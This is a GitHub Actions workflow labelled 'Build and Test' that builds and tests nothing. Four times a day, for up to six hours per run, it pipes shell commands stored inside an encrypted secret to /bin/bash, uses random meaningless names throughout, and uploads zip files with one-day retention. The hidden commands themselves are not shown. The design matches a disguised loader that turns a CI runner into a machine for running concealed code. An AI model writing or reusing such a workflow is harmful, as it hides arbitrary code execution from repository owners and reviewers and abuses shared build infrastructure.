name: Build and Test
on:
  workflow_dispatch:

  schedule:
    - cron: '16 4,10,16,22 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  main:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Process
        env:
          kiav6: ${{ secrets.kiav6 }}
        run: |
          printf '%s' "$kiav6" | jq -r .goj082 | /bin/bash
          printf '%s' "$ys50102" | jq -r .fda9 | /bin/bash
          echo $tctgq116 | jq -r .isk9 | /bin/bash

      - name: Archive output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: 0zJ63WLc
          path: "*.zip"
          retention-days: 1
